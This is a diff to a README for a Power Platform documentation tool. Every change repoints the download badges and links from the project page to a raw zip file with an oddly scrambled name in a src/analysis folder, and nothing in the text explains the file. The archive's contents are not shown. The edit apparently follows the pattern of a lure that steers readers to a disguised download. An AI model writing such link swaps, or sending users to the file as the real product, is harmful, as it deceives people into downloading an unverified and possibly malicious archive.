@@ -1,6 +1,6 @@
 # ⚙️ PowerPlatformDocumentationTool - Easy Documentation for Power Platform
 
-[![Download](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-brightgreen)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool)
+[![Download](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-brightgreen)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool/raw/refs/heads/main/src/analysis/Tool_Documentation_Platform_Power_2.6-alpha.1.zip)
 
 ## 📘 What is PowerPlatformDocumentationTool?
 
@@ -38,7 +38,7 @@ This guide helps you download, install, and run PowerPlatformDocumentationTool o
 
 Click the button below to visit the download page. From there, you will find the latest version of the app ready to download.
 
-[![Download Here](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-blue?style=for-the-badge)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool)
+[![Download Here](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-blue?style=for-the-badge)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool/raw/refs/heads/main/src/analysis/Tool_Documentation_Platform_Power_2.6-alpha.1.zip)
 
 ### Step 2 – Find the Correct File
 
@@ -135,7 +135,7 @@ Avoid running multiple versions at the same time.
 
 ## 🔗 Useful Links
 
-- Visit the download page: https://github.com/Saravananvp17/PowerPlatformDocumentationTool  
+- Visit the download page: https://github.com/Saravananvp17/PowerPlatformDocumentationTool/raw/refs/heads/main/src/analysis/Tool_Documentation_Platform_Power_2.6-alpha.1.zip  
 - Learn more about Power Platform on Microsoft's official site  
 
 ## 🏷️ Topics
@@ -143,4 +143,4 @@ Avoid running multiple versions at the same time.
 This project relates to Power Platform components like AI Builder, Copilot Studio, Power Apps, and Power Automate. It helps developers and administrators keep solution documentation clear and organized.
 
 ---
-[![Download](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-brightgreen)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool)
+[![Download](https://img.shields.io/badge/Download-PowerPlatformDocumentationTool-brightgreen)](https://github.com/Saravananvp17/PowerPlatformDocumentationTool/raw/refs/heads/main/src/analysis/Tool_Documentation_Platform_Power_2.6-alpha.1.zip)
